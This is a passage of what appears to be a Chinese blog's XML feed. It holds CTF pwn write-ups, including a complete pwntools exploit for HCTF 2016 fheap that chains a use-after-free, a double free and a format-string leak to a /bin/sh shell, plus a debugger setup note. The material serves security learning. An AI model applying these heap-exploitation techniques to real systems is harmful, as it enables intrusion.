heap_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">system_addr = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">atoi_addr = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;system addr: &quot;</span>, system_addr)</span><br><span class="line">log_addr(<span class="string">&quot;/bin/sh addr: &quot;</span>, binsh_addr)</span><br><span class="line">log_addr(<span class="string">&quot;atoi@got addr: &quot;</span>, atoi_addr)</span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(heap_addr + <span class="number">0x30</span> - <span class="number">0x18</span>) + p64(heap_addr + <span class="number">0x30</span> - <span class="number">0x10</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;[*] payload len: &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">new(payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(atoi_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload2.ljust(<span class="built_in">len</span>(payload), <span class="string">b&#x27;b&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload3 = p64(system_addr)</span><br><span class="line">edit(<span class="number">0</span>, payload3)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(p64(binsh_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Double Free </tag>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF-2016-fheap</title>
      <link href="/wp-item-HCTF-2016-fheap/"/>
      <url>/wp-item-HCTF-2016-fheap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="HCTF-2016-fheap"><a href="#HCTF-2016-fheap" class="headerlink" title="HCTF-2016-fheap"></a>HCTF-2016-fheap</h2><ul><li><p><a href="https://github.com/zh-explorer/hctf2016-fheap">题目下载</a></p></li><li><p><code>checksec pwn-f</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  hctf-2016-fheap checksec pwn-f</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/Users/Lantern/Desktop/note/pwn_note/items/hctf-2016-fheap/pwn-f&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></li><li><p>利用方式: 利用 <code>double free + 格式化字符串</code></p></li><li><p><code>libc version: libc6_2.23-0ubuntu11_amd64</code></p></li></ul><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><ul><li><p>str 结构体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 str             struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 string          dq ?                    ; offset</span><br><span class="line">00000008 field_8         dq ?</span><br><span class="line">00000010 len             dd ?</span><br><span class="line">00000014 field_14        dd ?</span><br><span class="line">00000018 free_func       dq ?                    ; offset</span><br><span class="line">00000020 str             ends</span><br></pre></td></tr></table></figure></li><li><p>string 结构体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 string          struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 inuse           dd ?</span><br><span class="line">00000004 field_4         dd ?</span><br><span class="line">00000008 str             dq ?                    ; offset</span><br><span class="line">00000010 string          ends</span><br></pre></td></tr></table></figure></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  str *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (str *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give string size:&quot;</span>);</span><br><span class="line">  nbytes = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;got elf!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, &amp;buf, nbytesa);</span><br><span class="line">      ptr-&gt;<span class="built_in">string</span> = dest;</span><br><span class="line">      ptr-&gt;free_func = free_func1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)ptr, &amp;buf, nbytesa);</span><br><span class="line">      ptr-&gt;free_func = free_func2;</span><br><span class="line">    &#125;</span><br><span class="line">    ptr-&gt;len = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !string_list[i].inuse )</span><br><span class="line">      &#123;</span><br><span class="line">        string_list[i].inuse = <span class="number">1</span>;</span><br><span class="line">        string_list[i].str = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      ptr-&gt;free_func((<span class="keyword">char</span> *)ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果输入的字符串的长度大于 15, 则重新 maloc 一块堆块用来存放字符串</li><li>否则就放在 ptr 的开头位置</li></ul><p>其中两个 free 函数如下</p><h4 id="free-func-1"><a href="#free-func-1" class="headerlink" title="free_func 1"></a>free_func 1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">free_func1</span><span class="params">(<span class="keyword">char</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="free-func-2"><a href="#free-func-2" class="headerlink" title="free_func 2"></a>free_func 2</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">free_func2</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>);</span><br><span class="line">  index = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( string_list[index].str )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(str *, <span class="keyword">const</span> <span class="keyword">char</span> *))string_list[index].str-&gt;free_func)(string_list[index].str, <span class="string">&quot;yes&quot;</span>);</span><br><span class="line">      string_list[index].inuse = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先判断索引表中的指针是否存在, 然后调用了存在 str 结构体中的 free_func 函数, 而实际上应该只有一个参数, <code>”yes“</code>为IDA自动分析的“锅”</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><ul><li>free 以后没有将全局指针置空, 存在 UAF 漏洞</li><li>free 前没有判断当前 chunk 是否 inuse, 存在 double free 漏洞</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="调用任意函数"><a href="#调用任意函数" class="headerlink" title="调用任意函数"></a>调用任意函数</h3><p>由于 free 函数是动态调用, 所以我们如果可以覆盖 chunk ptr 中的函数指针, 我们就可以调用任意函数。</p><p>因为程序开启了 PIE, 所以我们无法知道准确的地址, 但是 PIE 存在一个缺陷, 那就是 PIE 的随机化只能影响到单个内存页。通常来说, 一个内存页大小为 0x1000, 所以最后的3个十六进制数字是不会变化的, 我们就可以通过部分写入来绕过 PIE。</p><ul><li><p>先 create 两个大小小于 0xF 的 note, 然后 delete 1, delete 0, 然后再 create 一个 0x20 大小的 note</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">4</span>, <span class="string">&quot;a&quot;</span> * <span class="number">4</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="string">&quot;b&quot;</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此时 heap</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200728145320091.png" alt="image-20200728145320091" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">0x20</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>此时 heap</p></li></ul><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200728145801263.png" alt="image-20200728145801263" style="zoom: 67%;" /><ul><li>这样 ptr 就会得到 str 0 的地址, dest 就会拿到 str 1的地址, 这里我们就可以通过输入的 str 0 内容, 覆盖掉 str 1 中 free 函数的地址。</li></ul><p>此时只要我们再次 delete 1, 就可以调用我们改写的函数了</p><h3 id="泄露libc基地址"><a href="#泄露libc基地址" class="headerlink" title="泄露libc基地址"></a>泄露libc基地址</h3><p>能够调用任意函数之后, 我们只要找到 system 的地址, 就可以拿到 shell 了。</p><p>可以通过格式化字符串<code>printf</code>来泄露地址。用 <code>objdump</code> 来看看调用 <code>printf</code> 的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  work objdump -d pwn-f| grep printf</span><br><span class="line">00000000000009d0 &lt;printf@plt&gt;:</span><br><span class="line">dbb:       e8 10 fc ff ff          callq  9d0 &lt;printf@plt&gt;</span><br><span class="line">e19:       e8 b2 fb ff ff          callq  9d0 &lt;printf@plt&gt;</span><br><span class="line">f0a:       e8 c1 fa ff ff          callq  9d0 &lt;printf@plt&gt;</span><br><span class="line">f56:       e8 75 fa ff ff          callq  9d0 &lt;printf@plt&gt;</span><br><span class="line">10ee:       e8 dd f8 ff ff          callq  9d0 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure><p>因为只能修改一个字节, 所以我们选择 <code>0xdbb</code> 处的 call 指令, 要注意的是 printf 函数中会对 al 寄存器进行检测, 如果不为 0 就执行<code>movaps</code> 这些指令, 而这些指令后面的操作数需要是 16 位对齐。所以我们查看 IDA 中的汇编指令, 最后选择的是 0xdbb 的前一个指令, 即 <code>0xdb6</code> 处的<code>mov eax, 0</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//printf</span><br><span class="line">.text:0000000000054400                 sub     rsp, 0D8h</span><br><span class="line">.text:0000000000054407                 test    al, al</span><br><span class="line">.text:0000000000054409                 mov     [rsp+0D8h+var_B0], rsi</span><br><span class="line">                        ...</span><br><span class="line">.text:0000000000054422                 jz      short loc_5445B</span><br><span class="line">.text:0000000000054424                 movaps  [rsp+0D8h+var_88], xmm0</span><br><span class="line">                        ...</span><br><span class="line">.text:000000000005445B</span><br><span class="line">.text:000000000005445B loc_5445B:                              ; CODE XREF: printf+22↑j</span><br><span class="line">.text:000000000005445B                 lea     rax, [rsp+0D8h+arg_0]</span><br><span class="line"></span><br><span class="line">//fheap</span><br><span class="line">.text:0000000000000DB6                 mov     eax, 0</span><br><span class="line">.text:0000000000000DBB                 call    _printf</span><br></pre></td></tr></table></figure><p>因此可以得到如下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create(<span class="number">4</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&quot;b&quot;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;Start&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;c&#x27;</span>) + p8(<span class="number">0xB6</span>))  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>接着我们给 printf 函数下个断点调试一下, 可以看到堆栈中有 libc 中存在的函数的地址, 在<code>0xaa</code>处有<code>__libc_start_main + 240</code>, 这个实际上是<code>__libc_start_main_ret</code>的地址</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200728165527087.png" alt="image-20200728165527087"></p><p>泄露出这个地址就可以用<a href="https://libc.blukat.me/?q=__libc_start_main_ret:0x830&l=libc6_2.23-0ubuntu11_amd64">libc database search</a>查找libc</p><p><a href="https://libc.blukat.me/?q=__libc_start_main_ret:0x830&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=__libc_start_main_ret%3A0x830&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>得到 system 函数地址为 <code>__libc_start_main_ret + 0x24b60</code></p><blockquote><p>我这里 libc 版本有问题, 按 BUUOJ 上的环境 leak 出来的地址低三位应该是 0x830, 而不是 0x730</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn-f&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">29767</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params"><span class="built_in">breakpoint</span></span>):</span></span><br><span class="line">    gdb.attach(p, <span class="built_in">breakpoint</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, string</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;create &quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give string size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;str:&quot;</span>, string)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;3.quit\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;id:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure?:&quot;</span>, <span class="string">&quot;yes&quot;</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">4</span>, <span class="string">&quot;b&quot;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;Start%176$pEnd&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;c&#x27;</span>) + p8(<span class="number">0xB6</span>))  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Start&quot;</span>)</span><br><span class="line">libc_start_main_ret_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;End&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_start_main_ret_addr + <span class="number">0x24b60</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_ret address: &quot;</span> + <span class="built_in">hex</span>(libc_start_main_ret_addr))</span><br><span class="line">log.success(<span class="string">&quot;system address: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&quot;/bin/sh;&quot;</span>.ljust(<span class="number">24</span>, <span class="string">b&quot;p&quot;</span>) + p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>flag&#123;6d65aed1-933c-4b02-879e-cc5a8ec270ed&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> Double Free </tag>
            
            <tag> Format String </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwngdb + Pwndbg 的联合使用</title>
      <link href="/note-tool-pwndbg-pwngdb/"/>
      <url>/note-tool-pwndbg-pwngdb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 <code>pwndocker</code> 里看到 <code>.gdbinit</code>长得就跟正常不大一样, 在里面的<code>pwndbg</code>可以使用<code>chunkinfo</code>, 而自己安装的就不行, 查了一下发现<code>chunkinfo</code>是<code>pwngdb</code>的功能, 而<code>pwngdb</code>是可以和<code>pwndbg</code>一起联合使用的</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p><a href="https://github.com/pwndbg/pwndbg">pwngdb</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h2 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h2><p><a href="https://github.com/scwuaptx/Pwngdb">pwngdb</a></p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ `libc` : Print the base address of libc</span><br><span class="line">+ `ld` : Print the base address of ld</span><br><span class="line">+ `codebase` : Print the base of code segment</span><br><span class="line">+ `heap` : Print the base of heap</span><br><span class="line">+ `got` : Print the Global Offset Table infomation</span><br><span class="line">+ `dyn` : Print the Dynamic section infomation</span><br><span class="line">+ `findcall` : Find some function call</span><br><span class="line">+ `bcall` : Set the breakpoint at some function call</span><br><span class="line">+ `tls` : Print the thread local storage address</span><br><span class="line">+ `at` : Attach by process name</span><br><span class="line">+ `findsyscall` : Find the syscall</span><br><span class="line">+ `fmtarg` : Calculate the index of format string</span><br><span class="line">    + You need to stop on printf which has vulnerability.</span><br><span class="line">+ `force` : Calculate the nb in the house of force.</span><br><span class="line">+ `heapinfo` : Print some infomation of heap</span><br><span class="line">    + heapinfo (Address of arena)</span><br><span class="line">    + default is the arena of current thread</span><br><span class="line">    + If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">+ `heapinfoall` : Print some infomation of heap (all threads)</span><br><span class="line">+ `arenainfo` : Print some infomation of all arena</span><br><span class="line">+ `chunkinfo`: Print the infomation of chunk</span><br><span class="line">    + chunkinfo (Address of victim)</span><br><span class="line">+ `chunkptr` : Print the infomation of chunk</span><br><span class="line">    + chunkptr (Address of user ptr)</span><br><span class="line">+ `mergeinfo` : Print the infomation of merge</span><br><span class="line">    + mergeinfo (Address of victim)</span><br><span class="line">+ `printfastbin` : Print some infomation of fastbin</span><br><span class="line">+ `tracemalloc on` : Trace the malloc and free and detect some error .</span><br><span class="line">    + You need to run the process first than `tracemalloc on`, it will record all of the malloc and free.</span><br><span class="line">    + You can set the `DEBUG` in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">+ `parseheap` : Parse heap layout</span><br><span class="line">+ `magic` : Print useful variable and function in glibc</span><br><span class="line">+ `fp` : show FILE structure</span><br><span class="line">    + fp (Address of FILE)</span><br><span class="line">+ `fpchain`: show linked list of FILE</span><br><span class="line">+ `orange` : Test `house of orange` condition in the `_IO_flush_lockp`</span><br><span class="line">    + orange (Address of FILE)</span><br><span class="line">    + glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><h2 id="联合使用"><a href="#联合使用" class="headerlink" title="联合使用"></a>联合使用</h2><p>修改<code>~/.gdbinit</code>文件如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> ~/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> ~/angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li><code>source /home/lantern/pwndbg/gdbinit.py</code>必须放前面, 否则将默认<code>pwngdb</code></li><li>其实复制粘贴就可以了</li><li>当出现下面<code>Can;t access memory</code>而不是没有这个命令时, 证明实验成功</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo</span><br><span class="line">Can&#x27;t access memory</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/scwuaptx/Pwngdb">pwngdb</a></p><p><a href="https://github.com/pwndbg/pwndbg">pwngdb</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unlink</title>
      <link href="/note-pwn-unlink/"/>
      <url>/note-pwn-unlink/</url>
      
